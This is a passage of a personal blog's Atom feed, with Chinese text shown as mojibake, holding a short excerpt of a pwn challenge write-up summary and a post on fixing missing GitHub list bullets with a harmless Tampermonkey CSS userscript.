&lt;p&gt;è¿™é“é¢˜ç›®çš„è™šæ‹Ÿæœºè¿˜ç®—è§„æ•´ï¼Œä»mainå‡½æ•°å¼€å§‹çœ‹ï¼Œä»å¯¹è™šæ‹Ÿæœºåˆå§‹åŒ–çš„å‡½æ•°å…¥æ‰‹å¹¶ç»“åˆä»£ç æ‰§è¡Œçš„å‡½æ•°å¯ä»¥çœ‹å‡ºï¼Œæ•´ä½“çš„vmç»“æ„æ”¾åœ¨äº†bssï¼ŒåŒ…æ‹¬32ä¸ªé€šç”¨å¯„å­˜å™¨ï¼Œripï¼Œä»£ç æŒ‡é’ˆå’Œä»£ç å¤§å°ã€‚&lt;/</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
    <category term="vm" scheme="https://zjw1nd.github.io/tags/vm/"/>
    
  </entry>
  
  <entry>
    <title>å‰ç«¯å°å®è·µä¹‹ä¿®å¤githubåˆ—è¡¨æ¸²æŸ“é”™è¯¯</title>
    <link href="https://zjw1nd.github.io/2024/12/17/%E5%89%8D%E7%AB%AF%E5%B0%8F%E5%AE%9E%E8%B7%B5%E4%B9%8B%E4%BF%AE%E5%A4%8Dgithub%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93%E9%94%99%E8%AF%AF/"/>
    <id>https://zjw1nd.github.io/2024/12/17/%E5%89%8D%E7%AB%AF%E5%B0%8F%E5%AE%9E%E8%B7%B5%E4%B9%8B%E4%BF%AE%E5%A4%8Dgithub%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93%E9%94%99%E8%AF%AF/</id>
    <published>2024-12-16T16:21:39.000Z</published>
    <updated>2024-12-17T02:50:21.469Z</updated>
    
    <content type="html"><![CDATA[<h2 id="èµ·å› -é—®é¢˜æè¿°">èµ·å› /é—®é¢˜æè¿°</h2><p>ä»Šå¤©å…´è‡´æ¥äº†ä¸Šå¤´äº†æƒ³ç¼–è¾‘è‡ªå·±çš„Githubä¸»é¡µï¼Œå†™å¥½ä¹‹åçªç„¶å‘ç°æ‰€æœ‰çš„<strong>åˆ—è¡¨</strong>éƒ½ä¸¢å¤±äº†å‰ç¼€ã€‚å³æœ¬æ¥åº”è¯¥æ˜¯ï¼š</p><blockquote><p>1. xxx<br>2. xxx<br>Â· xxx</p></blockquote><p>ä½†æ˜¯å®é™…æ¸²æŸ“å‡ºæ¥çš„æ•ˆæœåªæœ‰ç¼©è¿›å¯¹é½è€Œæ²¡æœ‰è¿™äº›åºå·å’Œç‚¹çš„å‰ç¼€ï¼Œçœ‹èµ·æ¥éå¸¸çš„éš¾å—ï¼Œé‚å¼€å§‹æ’æŸ¥é—®é¢˜ã€‚</p><h2 id="æ£€æŸ¥è¿‡ç¨‹">æ£€æŸ¥è¿‡ç¨‹</h2><p>é¦–å…ˆè‚¯å®šæ˜¯æ£€æŸ¥äº†æºä»£ç ï¼Œmarkdownç¡®è®¤æ²¡æœ‰é—®é¢˜ä¹‹åå»githubéšä¾¿æœäº†ä¸ªmarkdownçš„æ•™ç¨‹ï¼Œå‘ç°ä¹Ÿæœ‰è¿™ä¸ªé—®é¢˜ï¼Œçœ‹æ¥é—®é¢˜å‡ºåœ¨æœ¬åœ°ã€‚</p><p>F12æ£€æŸ¥äº†ä¸€ä¸‹æºä»£ç ï¼Œmarkdownæœ€åä¼šè¢«æ¸²æŸ“æˆlistï¼šæœ‰åºåˆ—è¡¨å’Œæ— åºåˆ—è¡¨åˆ†åˆ«æ˜¯cssä¸­çš„olå’Œulæ ·å¼ï¼Œåˆ—è¡¨é¡¹åˆ™æ˜¯<code>&lt;li&gt;</code>ã€‚htmlä¸­ä¼šé‡‡ç”¨<code>&lt;ul&gt;&lt;/ul&gt;</code>æ ‡ç­¾è¿›è¡Œå®ç°ã€‚</p><p>æ£€æŸ¥CSSæ ·å¼å‘ç°ï¼Œ<code>&lt;li&gt;</code>å¯¹è±¡çš„ä¸€ä¸ªå…ƒç´ <code>list-style-type</code>çš„å€¼å±…ç„¶æ˜¯noneï¼Œåœ¨æ³¨å…¥çš„æ ·å¼é‡Œè¦†ç›–äº†æµè§ˆå™¨è‡ªå·±çš„User Agentæ ·å¼ã€‚</p><p>æ‰“å¼€ä¸€ä¸ªåˆ—è¡¨æ˜¾ç¤ºæ­£å¸¸çš„ç½‘ç«™æ£€æŸ¥ä¸€ä¸‹ï¼Œè¦æƒ³æ˜¾ç¤ºå‰ç¼€ï¼Œè¿™ä¸€é¡¹çš„å€¼åº”è¯¥æ˜¯<code>disc</code>æ‰å¯¹ã€‚åŒæ—¶æ›´æ¢æµè§ˆå™¨ç”¨æ‰‹æœºæ‰“å¼€å‘ç°æ˜¯æ­£å¸¸çš„</p><p>è™½ç„¶æˆ‘ä»¬ä¸çŸ¥é“githubæä¾›çš„æ ·å¼å‡ºäº†ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯æˆ‘ä»¬ä¼¼ä¹æœ¬åœ°ä¹Ÿä¸å¥½ä¿®è¿™ä¸ªé—®é¢˜ã€‚</p><h2 id="ç»“æœ">ç»“æœ</h2><p>é—®AIï¼Œaiç»™äº†æˆ‘ä¸€ä¸ªtamper monkeyçš„è„šæœ¬ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         GitHub List Style Fix</span></span><br><span class="line"><span class="comment">// @namespace    http://tampermonkey.net/</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  Change github list.</span></span><br><span class="line"><span class="comment">// @author       Zj_W1nd</span></span><br><span class="line"><span class="comment">// @match        https://github.com/*</span></span><br><span class="line"><span class="comment">// @grant        none</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ·»åŠ è‡ªå®šä¹‰æ ·å¼</span></span><br><span class="line">    <span class="keyword">const</span> style = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;style&#x27;</span>);</span><br><span class="line">    style.<span class="property">innerHTML</span> = <span class="string">`</span></span><br><span class="line"><span class="string">        ul, ol &#123;</span></span><br><span class="line"><span class="string">            list-style-type: disc !important;</span></span><br><span class="line"><span class="string">            margin-left: 20px !important;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    `</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(style);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>åœ¨githubç½‘é¡µä¸Šå¼ºåˆ¶ä¿®æ”¹å‰ç«¯çš„åˆ—è¡¨styleï¼Œè¿˜çœŸè§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚è¿™ä¹ˆä¸€ææ„Ÿè§‰å‰ç«¯å°±æ˜¯ç–¯ç‹‚çš„å„ç§æ ‡ç­¾å’Œå­—æ®µã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;èµ·å› -é—®é¢˜æè¿°&quot;&gt;èµ·å› /é—®é¢˜æè¿°&lt;/h2&gt;
&lt;p&gt;ä»Šå¤©å…´è‡´æ¥äº†ä¸Šå¤´äº†æƒ³ç¼–è¾‘è‡ªå·±çš„Githubä¸»é¡µï¼Œå†™å¥½ä¹‹åçªç„¶å‘ç°æ‰€æœ‰çš„&lt;strong&gt;åˆ—è¡¨&lt;/strong&gt;éƒ½ä¸¢å¤±äº†å‰ç¼€ã€‚å³æœ¬æ¥åº”è¯¥æ˜¯ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1. xxx&lt;br&gt;
2. xxx&lt;</summary>
      
    
    
    
    <category term="Develop" scheme="https://zjw1nd.github.io/categories/Develop/"/>
    
    
    <category term="Develop" scheme="https://zjw1nd.github.io/tags/Develop/"/>
    
    <category term="å‰ç«¯" scheme="https://zjw1nd.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
</feed>
